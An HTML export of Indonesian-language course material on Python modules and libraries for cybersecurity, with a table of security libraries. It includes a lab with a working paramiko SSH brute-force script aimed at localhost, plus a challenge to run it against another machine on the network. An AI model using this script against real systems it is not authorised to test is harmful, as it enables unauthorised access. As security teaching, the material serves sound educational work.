@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+        <html>
+        <head>
+            <meta charset="UTF-8">
+            <title>Modules dan Libraries</title>
+            <style>
+/* From extension vscode.github */
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+.vscode-dark img[src$=\#gh-light-mode-only],
+.vscode-light img[src$=\#gh-dark-mode-only],
+.vscode-high-contrast:not(.vscode-high-contrast-light) img[src$=\#gh-light-mode-only],
+.vscode-high-contrast-light img[src$=\#gh-dark-mode-only] {
+	display: none;
+}
+
+</style>
+            
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/markdown.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/highlight.css">
+<style>
+            body {
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe WPC', 'Segoe UI', system-ui, 'Ubuntu', 'Droid Sans', sans-serif;
+                font-size: 14px;
+                line-height: 1.6;
+            }
+        </style>
+        <style>
+.task-list-item {
+    list-style-type: none;
+}
+
+.task-list-item-checkbox {
+    margin-left: -20px;
+    vertical-align: middle;
+    pointer-events: none;
+}
+</style>
+<style>
+:root {
+  --color-note: #0969da;
+  --color-tip: #1a7f37;
+  --color-warning: #9a6700;
+  --color-severe: #bc4c00;
+  --color-caution: #d1242f;
+  --color-important: #8250df;
+}
+
+</style>
+<style>
+@media (prefers-color-scheme: dark) {
+  :root {
+    --color-note: #2f81f7;
+    --color-tip: #3fb950;
+    --color-warning: #d29922;
+    --color-severe: #db6d28;
+    --color-caution: #f85149;
+    --color-important: #a371f7;
+  }
+}
+
+</style>
+<style>
+.markdown-alert {
+  padding: 0.5rem 1rem;
+  margin-bottom: 16px;
+  color: inherit;
+  border-left: .25em solid #888;
+}
+
+.markdown-alert>:first-child {
+  margin-top: 0
+}
+
+.markdown-alert>:last-child {
+  margin-bottom: 0
+}
+
+.markdown-alert .markdown-alert-title {
+  display: flex;
+  font-weight: 500;
+  align-items: center;
+  line-height: 1
+}
+
+.markdown-alert .markdown-alert-title .octicon {
+  margin-right: 0.5rem;
+  display: inline-block;
+  overflow: visible !important;
+  vertical-align: text-bottom;
+  fill: currentColor;
+}
+
+.markdown-alert.markdown-alert-note {
+  border-left-color: var(--color-note);
+}
+
+.markdown-alert.markdown-alert-note .markdown-alert-title {
+  color: var(--color-note);
+}
+
+.markdown-alert.markdown-alert-important {
+  border-left-color: var(--color-important);
+}
+
+.markdown-alert.markdown-alert-important .markdown-alert-title {
+  color: var(--color-important);
+}
+
+.markdown-alert.markdown-alert-warning {
+  border-left-color: var(--color-warning);
+}
+
+.markdown-alert.markdown-alert-warning .markdown-alert-title {
+  color: var(--color-warning);
+}
+
+.markdown-alert.markdown-alert-tip {
+  border-left-color: var(--color-tip);
+}
+
+.markdown-alert.markdown-alert-tip .markdown-alert-title {
+  color: var(--color-tip);
+}
+
+.markdown-alert.markdown-alert-caution {
+  border-left-color: var(--color-caution);
+}
+
+.markdown-alert.markdown-alert-caution .markdown-alert-title {
+  color: var(--color-caution);
+}
+
+</style>
+        
+        </head>
+        <body class="vscode-body vscode-light">
+            <h1 id="modules-dan-libraries">Modules dan Libraries</h1>
+<p><em>Basic Python for Cybersecurity</em></p>
+<p><em>© 2025 Yogi Agnia Dwi Saputro dan PT. Cyberkarta Tugu Teknologi.</em></p>
+<p>Dilarang keras memperbanyak, menyalin, mendistribusikan, atau menggunakan sebagian atau seluruh isi karya ini dalam bentuk apapun tanpa izin tertulis dari pemegang hak cipta.</p>
+<hr>
+<h2 id="definisi">Definisi</h2>
+<ul>
+<li><strong>Module</strong>: satu file (.py) yang berisi  variable, function, atau class yang bisa digunakan ulang.</li>
+<li><strong>Library</strong>: Sekumpulan module yang dirangkai untuk menjalankan komputasi di domain spesifik.</li>
+</ul>
+<h2 id="sumber-library">Sumber Library</h2>
+<ul>
+<li><strong>Modul Internal</strong>: langsung didapat ketika instalasi Python. Misal: <code>os</code>, <code>sys</code>, <code>datetime</code>, <code>math</code></li>
+<li><strong>Modul Eksternal</strong>: didapat dari repository resmi Python, <a href="https://pypi.org/">PyPI</a></li>
+</ul>
+<h2 id="penggunaan-library">Penggunaan Library</h2>
+<h3 id="modul-internal">Modul Internal</h3>
+<pre><code class="language-python"><span class="hljs-comment"># import seluruh modul</span>
+<span class="hljs-keyword">import</span> math
+<span class="hljs-built_in">print</span>(math.sqrt(<span class="hljs-number">25</span>))  <span class="hljs-comment"># Output: 5.0</span>
+
+<span class="hljs-comment"># import sebagian modul</span>
+<span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> sqrt
+<span class="hljs-built_in">print</span>(sqrt(<span class="hljs-number">25</span>))       <span class="hljs-comment"># Output: 5.0</span>
+</code></pre>
+<h3 id="modul-eksternal">Modul Eksternal</h3>
+<ul>
+<li>Direkomendasikan untuk setup virtual environment dahulu</li>
+<li>Install library</li>
+</ul>
+<pre><code>pip install paramiko
+</code></pre>
+<ul>
+<li>Import library</li>
+</ul>
+<pre><code class="language-python"><span class="hljs-comment"># import dengan nama agar ringkas</span>
+<span class="hljs-keyword">import</span> paramiko <span class="hljs-keyword">as</span> pko
+</code></pre>
+<h2 id="library-umum-terkait-cybersecurity">Library Umum Terkait Cybersecurity</h2>
+<table>
+<thead>
+<tr>
+<th>Library</th>
+<th>Use Case</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>socket</code></td>
+<td>Networking, port scanning, fetch banner</td>
+</tr>
+<tr>
+<td><code>scapy</code></td>
+<td>Packet crafting, sniffing</td>
+</tr>
+<tr>
+<td><code>paramiko</code></td>
+<td>SSH automation &amp; testing</td>
+</tr>
+<tr>
+<td><code>nmap</code></td>
+<td>Manipulasi Nmap Python</td>
+</tr>
+<tr>
+<td><code>requests</code></td>
+<td>melakukan HTTP request (login, API, dll)</td>
+</tr>
+<tr>
+<td><code>shodan</code></td>
+<td>Search engine device terkoneksi internet</td>
+</tr>
+<tr>
+<td><code>pycryptodome</code></td>
+<td>Encryption, hashing</td>
+</tr>
+<tr>
+<td><code>beautifulsoup4</code></td>
+<td>HTML parsing, scraping</td>
+</tr>
+</tbody>
+</table>
+<p>Masih ada banyak lagi. Lakukan eksplorasi dan silakan baca berbagai artikel.</p>
+<h2 id="praktik-ssh-brute-force-dengan-paramiko">Praktik: SSH Brute Force dengan Paramiko</h2>
+<p>SSH adalah suatu mekanisme koneksi dari suatu komputer untuk terhubung ke server. Anggaplah SSH sebagai pintu gerbang dari sebuah benteng. Selayaknya pintu gerbang utama, SSH harus memiliki pertahanan yang kuat. Dalam cybersecurity, hal itu berarti minimal password yang aman beserta mekanisme lainnya.
+Jika password SSH tidak aman (password pendek, sederhana, mudah ditebak, atau password bocor), seseorang dapat melakukan serangan brute force untuk mendapatkan akses.
+Di sini, kamu akan melakukan simulasi serangan SSH brute force menggunakan program Python dilengkapi library <code>paramiko</code>.</p>
+<p>Langkah-langkah</p>
+<ol>
+<li>Setup SSH di localhost</li>
+<li>Setup credential di localhost (catat kombinasi username-password nya) - optional (bisa pakai user existing)</li>
+<li>Buat program di Python</li>
+<li>Jalankan program Python</li>
+</ol>
+<p><strong>Setup SSH di localhost</strong></p>
+<ul>
+<li>Instalasi openSSH</li>
+</ul>
+<pre><code>sudo apt update
+sudo apt install openssh-server -y
+</code></pre>
+<ul>
+<li>Jalankan service <code>ssh</code> di background</li>
+</ul>
+<pre><code>sudo service ssh start
+</code></pre>
+<ul>
+<li>Cek service <code>ssh</code></li>
+</ul>
+<pre><code>sudo service ssh status
+</code></pre>
+<p><strong>Buat program di Python</strong></p>
+<pre><code class="language-python"><span class="hljs-comment"># ssh_brute_force.py</span>
+<span class="hljs-keyword">import</span> paramiko
+
+<span class="hljs-comment"># taruh list credentials di sini. tambahkan jika perlu</span>
+credentials = [
+    (<span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;toor&quot;</span>),
+    (<span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;root123&quot;</span>),
+    (<span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;123456&quot;</span>),
+    <span class="hljs-comment"># user kali yang berhasil, dengan asumsi memakai Kali Linux</span>
+    (<span class="hljs-string">&quot;kali&quot;</span>,<span class="hljs-string">&quot;kali&quot;</span>) 
+
+]
+
+<span class="hljs-comment"># kita setup untuk attack SSH di localhost</span>
+target_ip = <span class="hljs-string">&quot;127.0.0.1&quot;</span>
+
+ssh = paramiko.SSHClient()
+ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+<span class="hljs-keyword">for</span> username, password <span class="hljs-keyword">in</span> credentials:
+    <span class="hljs-keyword">try</span>:
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;🔄 Trying <span class="hljs-subst">{username}</span>:<span class="hljs-subst">{password}</span> ...&quot;</span>)
+        ssh.connect(target_ip, username=username, password=password, timeout=<span class="hljs-number">5</span>)
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;✅ Login success with <span class="hljs-subst">{username}</span>:<span class="hljs-subst">{password}</span>!&quot;</span>)
+        
+        <span class="hljs-comment"># ekspektasi masuk dan dan tampilkan informasi</span>
+        stdin, stdout, stderr = ssh.exec_command(<span class="hljs-string">&quot;whoami&quot;</span>)
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;📟 Server says:&quot;</span>, stdout.read().decode().strip())
+        
+        ssh.close()
+        <span class="hljs-keyword">break</span>  <span class="hljs-comment"># Stop after first success</span>
+
+    <span class="hljs-keyword">except</span> paramiko.AuthenticationException:
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;❌ Login failed.&quot;</span>)
+    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;⚠️ Error:&quot;</span>, <span class="hljs-built_in">str</span>(e))
+</code></pre>
+<p><strong>Jalankan Program Python</strong></p>
+<pre><code>python3 ssh_brute_force.py
+</code></pre>
+<h2 id="extra-challenge"><em>Extra Challenge</em></h2>
+<ul>
+<li>Coba buat program sederhana untuk minimal 3 library terkait cybersecurity</li>
+<li>Coba setup SSH di komputer lain dalam satu jaringan, lalu jalankan kembali SSH brute force</li>
+</ul>
+<h2 id="referensi">Referensi</h2>
+<ul>
+<li>Top installed cybersecurity module: <a href="https://www.geeksforgeeks.org/top-10-python-libraries-for-cybersecurity/">https://www.geeksforgeeks.org/top-10-python-libraries-for-cybersecurity/</a></li>
+</ul>
+
+            
+            
+        </body>
+        </html>
